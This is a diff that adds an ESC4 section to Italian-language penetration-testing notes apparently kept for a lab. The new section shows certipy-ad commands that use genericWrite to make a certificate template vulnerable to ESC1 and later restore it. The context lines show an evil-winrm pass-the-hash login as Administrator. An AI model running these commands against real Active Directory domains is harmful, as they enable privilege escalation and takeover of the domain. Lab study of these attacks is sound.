@@ -57,3 +57,15 @@ Usa l'hash per loggare tramite evil-winrm
 ```bash
 evil-winrm -i 10.10.11.202 -u Administrator -H <HASH>
 ```
+### **ESC 4 - ADCS**
+Grazie al permesso genericWrite possiamo modificare il nostro template per renderlo vulnerabile all'ESC1
+```bash
+certipy-ad template -u <USER>@<DOMAIN -p 'horse' -template ESC4 -save-old -debug
+```
+![[Pasted image 20230828151521.png]]
+Poi exploitalo come ESC1.
+Per riportarlo alla normalità
+```bash
+certipy-ad template -u khal.drogo@essos.local -p 'horse' -template ESC4 -configuration ESC4.json
+```
+![[Pasted image 20230828151547.png]]
